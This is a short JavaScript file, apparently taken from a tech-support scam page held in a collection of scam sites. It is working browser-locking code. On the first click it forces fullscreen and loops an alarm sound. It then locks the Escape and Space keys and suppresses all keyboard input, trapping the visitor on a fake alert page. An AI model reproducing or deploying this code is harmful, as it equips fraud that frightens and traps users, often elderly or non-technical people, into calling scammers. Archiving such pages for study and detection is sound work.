function getQueryParam(param) {
    const urlParams = new URLSearchParams(window.location.search);
    return urlParams.get(param);
}
$(document).ready(function(){

    var audioElement = document.createElement('audio');
    audioElement.setAttribute('src', 'https://github.com/kaepi2022/Scam-Site-collection/raw/main/WindowsKun/js/alert-en.wav');
    
    audioElement.addEventListener('ended', function() {
        this.play();
    }, false);
    addEventListener("click", function() {
        var el = document.documentElement
            , reffer =
                   el.requestFullScreen
                || el.webkitRequestFullScreen
                || el.mozRequestFullScreen
        ;
        reffer.call(el);
        audioElement.play();
    });

   if ('keyboard' in navigator && 'lock' in navigator.keyboard) {
        // Request to lock the keyboard
        navigator.keyboard.lock(['Escape', 'Space']); // Locks the 'Escape' and 'Space' keys
      } else {
        console.log('Keyboard Lock API is not supported in this browser.');
      }
    document.addEventListener('keydown', function(event) {
        event.preventDefault();
    }, false);
   
});